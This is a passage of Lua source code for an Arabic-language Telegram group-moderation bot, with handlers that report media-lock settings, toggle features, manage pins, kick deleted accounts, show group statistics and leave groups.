if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^المتحركه$") or text and text:match("^الملصقات المتحركه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مـقفۄڵة' else mute_gifs = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵمتحركه ↫ "..mute_gifs.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الملصقات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مـقفۄڵة' else lock_sticker = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵمڵصقٱت ↫ "..lock_sticker.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الملفات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then lock_file = 'مـقفۄڵة' else lock_file = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵمڵفٱت ↫ "..lock_file.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الصور$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مـقفۄڵة' else mute_photo = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵصور ↫ "..mute_photo.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الفيديو$") or text and text:match("^الفيديوهات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then mute_video = 'مـقفۄڵة' else mute_video = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵفيديو ↫ "..mute_video.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الاونلاين$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مقفڵ' else mute_in = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱلٱونلٱين ↫ "..mute_in.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الدردشه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then mute_text = 'مقفڵة' else mute_text = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵدردشه ↫ "..mute_text.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^التوجيه$") or text and text:match("^اعاده التوجيه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مقفڵ' else lock_forward = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱڵتوجيه ↫ "..lock_forward.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الاغاني$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then mute_music = 'مـقفۄڵة' else mute_music = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱلٱغٱني ↫ "..mute_music.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الصوت$") or text and text:match("^الصوتيات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مـقفۄڵ' else mute_voice = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱڵصوت ↫ "..mute_voice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الجهات$") or text and text:match("^جهات الاتصال$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مـقفۄڵة' else lock_contact = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵجهات ↫ "..lock_contact.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الماركداون$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then markdown = 'مقفڵ' else markdown = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱڵمٱركدٱون ↫ "..markdown.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الحمايه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then strict = 'مـقفۄڵة' else strict = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵحمٱيه ↫ "..strict.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الهاشتاك$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then lock_htag = 'مقفڵ' else lock_htag = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱڵهٱشتٱك ↫ "..lock_htag.."\n"Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^التعديل$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then mute_edit = 'مقفڵ' else mute_edit = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱڵتعديل ↫ "..mute_edit.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^التثبيت$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مقفڵ' else lock_pin = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱڵتثبيت ↫ "..lock_pin.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الاشعارات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مـقفۄڵة' else lock_tgservice = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱلٱشعٱرٱت ↫ "..lock_tgservice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الكلايش$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مـقفۄڵة' else lock_spam = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵكلٱيش ↫ "..lock_spam.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الشبكات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مـقفۄڵة' else lock_wp = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵشبكٱت ↫ "..lock_wp.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^المواقع$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then lock_location = 'مـقفۄڵة' else lock_location = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵموٱقع ↫ "..lock_location.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^العربيه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مـقفۄڵة' else lock_arabic = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵعربيه ↫ "..lock_arabic.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الانكليزيه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then lock_english = 'مـقفۄڵة' else lock_english = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱلٱنكڵيزيه ↫ "..lock_english.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^التكرار$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then mute_flood = 'مقفڵ' else mute_flood = 'مفتوح' end local ABS_PROX = "\n" .."☬︙ٱڵتكرٱر ↫ "..mute_flood.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الكفر$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'kaf'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفڵ' end local ABS_PROX = "\n" .."☬︙ٱڵكفر ↫ "..lock_kaf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الفشار$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفڵ' end local ABS_PROX = "\n" .."☬︙ٱڵفشٱر ↫ "..lock_fshar.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الطائفيه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'taf'..msg.chat_id_) then lock_taf = 'مفتوحة' else lock_taf = 'مقفڵه' end local ABS_PROX = "\n" .."☬︙ٱڵطٱئفيه ↫ "..lock_taf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
--     Source DevProx     --
if text == 'تفعيل كشف الاعدادات' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then   
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ كشف ٱلٱعدٱدٱت'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:lock_Settings'..msg.chat_id_) 
end
if text == 'تعطيل كشف الاعدادات' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then  
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ كشف ٱلٱعدٱدٱت'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:lock_Settings'..msg.chat_id_,true)  
end
--     Source DevProx     --
if text == 'تفعيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then   
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ منو ضٱفني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'Added:Me'..msg.chat_id_) 
end
if text == 'تعطيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then  
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ منو ضٱفني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'Added:Me'..msg.chat_id_,true)  
end
--     Source DevProx     --
if is_leader(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ☬' then   
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱڵمغٱدرة بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:srem(DevProx.."Left:Bot",msg.chat_id_)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ☬' then  
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱڵمغٱدرة بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:sadd(DevProx.."Left:Bot",msg.chat_id_) 
end end
--     Source DevProx     --
if text and text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تغيير ٱسم ٱڵـمجموعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
--     Source DevProx     --
if text and text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text and text:match("^وضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙أرسَل صوٌرة المجًموًعة الًان \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source DevProx     --
if text and text:match('^↫ المجموعات ☬$') and Abbas_Abs(msg) or text and text:match('^المجموعات$') then
if not is_sudo3(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطورين فقط ', 1, 'md')
else
local list = DevAbs:smembers(DevProx.."bot:groups")
local t = '☬︙مجموعٱت ٱڵـبوت ↫ ⤈ \n'
for k,v in pairs(list) do
t = t..k.." • {`"..v.."`}\n" 
end
if #list == 0 then
t = '☬︙لٱ يوجد مجموعٱت مفعڵة '
end
Dev_Abs(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     Source DevProx     --
if text and text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text and text:match("^الغاء التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
if DevAbs:sismember(DevProx.."bot:pin:mutepin",msg.chat_id_) and not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙ٱڵتثبيت وٱڵغٱء وٱعٱدة ٱڵتثبيت تم قفڵه من قبڵ ٱڵمنشئين ٱلٱسٱسيين", 1, 'md')
return false  
end
unpinmsg(msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم ٱڵـغٱء تثبيت ٱڵـرسالة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
--     Source DevProx     --
if text and text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text and text:match("^اعاده التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text and text:match("^اعادة التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
if DevAbs:sismember(DevProx.."bot:pin:mutepin",msg.chat_id_) and not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙ٱڵتثبيت وٱڵغٱء وٱعٱدة ٱڵتثبيت تم قفڵه من قبڵ ٱڵمنشئين ٱلٱسٱسيين", 1, 'md')
return false  
end
local pin_id = DevAbs:get(DevProx..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم ٱعـٱدة تثبيت ٱڵـرسالة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
else
end
end       
--     Source DevProx     --
if text and text:match("^kick delete$") or text and text:match("^طرد الحسابات المحذوفه$") and Abbas_Abs(msg) or text and text:match("^طرد المحذوفين$") and Abbas_Abs(msg) or text and text:match("^حذف المحذوفين$") and Abbas_Abs(msg) or text and text:match("^مسح المحذوفين$") and Abbas_Abs(msg) then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end
end
getUser(v.user_id_, cleanaccounts, nil)
end 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم طرد ٱڵـمحذوفين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--     Source DevProx     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and Abbas_Abs(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Abs(msg.chat_id_, msg.id_, 0,'☬︙لٱ يوجد محظورين في ٱڵـمجموعة', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
DevAbs:del(DevProx..'bot:banned:'..msg.chat_id_)
x = x + 1
end
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمحظورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
--     Source DevProx     --
if text and text:match("^(gpinfo)$") or text and text:match("^معلومات المجموعه$") and Abbas_Abs(msg) or text and text:match("^عدد الاعضاء$") and Abbas_Abs(msg) or text and text:match("^عدد الكروب$") and Abbas_Abs(msg) or text and text:match("^عدد الادمنيه$") and Abbas_Abs(msg) or text and text:match("^عدد المحظورين$") and Abbas_Abs(msg) then
function gpinfo(arg,data)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمجموعة↫ ❨ '..title_name(msg.chat_id_)..' ❩\n☬︙ٱلٱيـدي ↫ ❨ '..msg.chat_id_..' ❩\n☬︙عدد ٱلٱعضٱء ↫ ❨ *'..data.member_count_..'* ❩\n☬︙عدد ٱلٱدمنية ↫ ❨ *'..data.administrator_count_..'* ❩\n☬︙عدد ٱڵـمحظورين ↫ ❨ *'..data.kicked_count_..'* ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
--     Source DevProx     --
if text and text:match('^كشف (-%d+)') then
local chattid = text:match('كشف (-%d+)') 
if not is_sudo3(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطورين فقط ', 1, 'md')
else
function abs_c9(arg,data)
function ABS_PROX(f1,f2)
function DevProx3(t1,t2)
local list = DevAbs:smembers(DevProx.."abs:monsh:" .. chattid)
if list[1] or list[2] or list[3] or list[4] then
user_info = DevAbs:get(DevProx.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
end
if user_info then
monsh = user_info
else
monsh = "لا يوجد"
end
local Monsh = DevAbs:scard(DevProx.."abs:monsh:" .. chattid) or "0"
local Baned = DevAbs:scard(DevProx.."bot:banned:" .. chattid) or "0"
local Owner = DevAbs:scard(DevProx.."abs:owners:" .. chattid) or "0"
local Muted = DevAbs:scard(DevProx.."bot:muted:" .. chattid) or "0"
local Tkeed = DevAbs:scard(DevProx.."bot:keed:" .. chattid) or "0"
local admins = DevAbs:scard(DevProx.."abs:admins:" .. chattid) or "0"
local Vip = DevAbs:scard(DevProx.."abs:vipmem:" .. chattid) or "0"
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@Dev_Prox")) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵـمجموعة : ( ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/Dev_Prox")..") )\n☬︙ٱلٱيـدي : ( *"..msg.chat_id_.."* )\n☬︙ٱڵـمنشئ : ( ["..monsh.."] )\n☬︙عدد ٱلٱعضٱء : ( *"..data.member_count_.."* )\n☬︙عدد ٱڵـمـدرٱء : ( *"..Owner.."* )\n☬︙عدد ٱڵـمنشئين : ( *"..Monsh.."* )\n☬︙عدد ٱلٱدمنية : ( *"..admins.."* )\n☬︙عدد ٱڵـمميزين : ( *"..Vip.."* )\n☬︙عدد ٱڵـمحظورين : ( *"..Baned.."* )\n☬︙عدد ٱڵـمقيدين : ( *"..Tkeed.."* )\n☬︙عدد ٱڵـمكتومين : ( *"..Muted.."* )\n\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(chattid).ID
}, DevProx3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
end
getChannelFull(chattid, abs_c9, nil)
end 
end
--     Source DevProx     --
if text and text:match("^غادر (-%d+)$")  then
local txt = { string.match(text, "^(غادر) (-%d+)$")}
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط', 1, 'md')
else 
local leavegp = function(extra, result)
if result.id_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵـمجموعة ( " .. result.title_ .. " )\n☬︙تمت ٱڵمغٱدرة منهٱ بٱمر ٱڵمطور ", 1, "md")
Dev_Abs(txt[2], 0, 1, "☬︙بٱمر ٱڵمطور تم مغٱدرة هذه ٱڵـمجموعة ", 1, "md")  
chat_leave(result.id_, bot_id)
DevAbs:srem(DevProx.."bot:groups", result.id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ڵم تتم ٱضٱفتي فيهٱ لٱقوم بمغٱدرتهٱ ", 1, "md")
end  end
getChat(txt[2], leavegp) 
end end
--     Source DevProx     --
if text == 'تفعيل البوت الخدمي' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط', 1, 'md')
else 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱڵـبوت ٱڵخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'lock:bot:free'..bot_id) 
end end
if text == 'تعطيل البوت الخدمي' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط', 1, 'md')
else 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱڵـبوت ٱڵخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'lock:bot:free'..bot_id,true) 
end end
if text == 'تفعيل التنبيه' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط', 1, 'md')
else 
local  ABS_PROX = '☬︙تـۖم تـفعيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء \n☬︙فـي جميع مجموعٱت ٱڵـبوت ' 
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:del(DevProx..'lock:bot:ttt'..bot_id) 
end 
end
if text == 'تعطيل التنبيه' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط', 1, 'md')
else 
ABS_PROX = '☬︙تـۖم تـعطيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء\n☬︙فـي جميع مجموعٱت ٱڵـبوت '
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:set(DevProx..'lock:bot:ttt'..bot_id,true) 
end
end
if text and text == "تفعيل تنبيه التغيرات" and Abbas_Abs(msg) then
if DevAbs:get(DevProx..'lock:bot:ttt'..bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـتنبيه على تغيـير\n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء\n☬︙معطـۧڵ فـي جميع مجموعٱت ٱڵـبوت مـن قِبـل ٱڵـمطور ', 1, 'md')
return false 
end
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمشرفين فقط ', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تـفعيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء \n☬︙فـي هذه ٱڵـمجموعة ', 1, 'md')
DevAbs:del(DevProx.."lock:bot:ttt2:"..msg.chat_id_)
end
end
if text and text == "تعطيل تنبيه التغيرات" and Abbas_Abs(msg) then 
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمشرفين فقط ', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تـعطيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء \n☬︙فـي هذه ٱڵـمجموعة ', 1, 'md')
DevAbs:set(DevProx.."lock:bot:ttt2:"..msg.chat_id_,"ok")
end
end
if text == 'تفعيل الالعاب' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text == 'تعطيل اللعبه' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then   
